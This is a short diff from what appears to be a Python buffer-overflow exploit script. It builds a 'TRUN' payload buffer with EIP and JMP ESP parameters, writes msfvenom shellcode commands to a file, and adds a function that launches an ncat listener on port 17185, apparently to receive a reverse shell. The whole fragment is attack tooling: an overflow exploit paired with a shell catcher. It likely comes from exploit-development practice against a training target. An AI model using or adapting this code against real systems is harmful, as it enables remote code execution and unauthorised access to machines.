@@ -50,8 +50,6 @@ def exploit(host, port, fuzzsize, eip, jmpesp):
     with open("./scripts/msfshellcode/msfvenomcmd.ps1", "w") as file:
         file.write(newlines)
 
-    print("Offset: {}".format(offset))
-
     try:
         buffer = b"".join([
             b"TRUN",
@@ -82,3 +80,13 @@ def exploit(host, port, fuzzsize, eip, jmpesp):
 
     except socket.error:
         print("Couldn't connect to socket")
+
+
+def terminal():
+    subprocess.Popen(
+        [
+            "powershell",
+            ".\\external-tools\\Ncat-Portable\\ncat.exe",
+            "-lvnp", "17185"
+        ], creationflags=subprocess.CREATE_NEW_CONSOLE
+    )
